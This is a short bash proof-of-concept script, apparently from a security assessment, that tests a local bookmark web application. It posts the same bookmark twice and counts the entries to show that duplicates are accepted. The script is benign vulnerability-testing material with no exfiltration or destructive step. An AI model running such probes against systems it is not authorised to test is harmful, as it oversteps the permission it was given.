#!/bin/bash
# POC: Duplicate Bookmarks Business Logic Flaw
# Application allows adding identical bookmarks with same name and URL

TARGET="http://localhost:5000"

curl -s -c /tmp/poc_dup.txt "$TARGET/list" > /dev/null

# Add first bookmark
curl -s -b /tmp/poc_dup.txt -c /tmp/poc_dup.txt -X POST "$TARGET/add" \
  -d "name=TestBookmark&url=http://example.com" > /dev/null

echo "[*] First bookmark added"
COUNT1=$(curl -s -b /tmp/poc_dup.txt "$TARGET/list" | grep -c "TestBookmark")
echo "[+] Count: $COUNT1"

# Add identical bookmark again
curl -s -b /tmp/poc_dup.txt -c /tmp/poc_dup.txt -X POST "$TARGET/add" \
  -d "name=TestBookmark&url=http://example.com" > /dev/null

echo "[*] Identical bookmark added again"
COUNT2=$(curl -s -b /tmp/poc_dup.txt "$TARGET/list" | grep -c "TestBookmark")
echo "[+] Count: $COUNT2"

if [ "$COUNT2" -gt "$COUNT1" ]; then
  echo "[!] VULNERABILITY: Duplicate bookmarks allowed!"
  exit 0
else
  echo "[-] Duplicates are prevented"
  exit 1
fi
